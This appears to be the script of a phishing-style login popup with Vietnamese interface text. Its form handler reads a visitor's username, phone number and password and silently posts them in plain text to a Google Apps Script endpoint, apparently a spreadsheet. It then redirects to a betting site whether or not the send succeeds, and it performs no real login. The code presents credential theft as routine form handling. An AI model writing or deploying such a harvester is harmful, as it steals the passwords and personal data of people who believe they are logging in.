document.addEventListener('DOMContentLoaded', () => {
  // Elements
  const loginBtn = document.getElementById('BUTTON19');
  const popupSection = document.getElementById('SECTION_POPUP');
  const popupContainer = document.getElementById('POPUP1');
  const closeBtn = document.getElementById('popup-close-btn');
  const backdrop = document.getElementById('backdrop-popup');
  const loginForm = document.getElementById('login-form');
  const submitButtonText = document.querySelector('#BUTTON_TEXT18 .ladi-headline');
  const submitButton = document.querySelector('#BUTTON18 button');

  // Google Apps Script URL
  const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbya-T8hURlVDL573F8-rAXv73CqAsYoUKgyCXj_-GhXXYmtK3JdiWwZXPSQI08oe4yP/exec';
  // Redirect URL
  const REDIRECT_URL = 'https://8x8899.com/sportEvents';

  // Open Modal function
  const openModal = () => {
    popupSection.style.display = 'flex';
    // Force reflow
    popupSection.offsetHeight;
    popupSection.classList.add('active');
  };

  // Close Modal function
  const closeModal = () => {
    popupSection.classList.remove('active');
    // Wait for the transition to finish before hiding display
    setTimeout(() => {
      popupSection.style.display = 'none';
    }, 300);
  };

  // Event Listeners
  if (loginBtn) {
    loginBtn.addEventListener('click', openModal);
  }

  if (closeBtn) {
    closeBtn.addEventListener('click', closeModal);
  }

  if (backdrop) {
    backdrop.addEventListener('click', closeModal);
  }

  // Handle Form Submission
  if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const username = document.getElementById('username-input').value;
      const phone = document.getElementById('phone-input').value;
      const password = document.getElementById('password-input').value;
      
      if (username && phone && password) {
        // 1. Show loading state
        if (submitButtonText) submitButtonText.textContent = 'ĐANG XỬ LÝ...';
        if (submitButton) submitButton.disabled = true;
        
        // Disable inputs
        const inputs = loginForm.querySelectorAll('input');
        inputs.forEach(input => input.disabled = true);

        try {
          // 2. Post data to Google Sheets Web App
          // We use no-cors to avoid CORS issue with Google Script redirecting,
          // which is the standard robust method for static sites.
          await fetch(SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              name: username,
              phone: phone,
              password: password
            })
          });

          // Wait a tiny bit to ensure the request is dispatched successfully
          await new Promise(resolve => setTimeout(resolve, 800));

          // 3. Redirect to the target URL
          window.location.href = REDIRECT_URL;
          
        } catch (error) {
          console.error('Error submitting form:', error);
          // In case of error, still attempt to redirect so customer does not get stuck
          window.location.href = REDIRECT_URL;
        }
      }
    });
  }

  // Close popup with Escape key
  window.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && popupSection.classList.contains('active')) {
      closeModal();
    }
  });
});
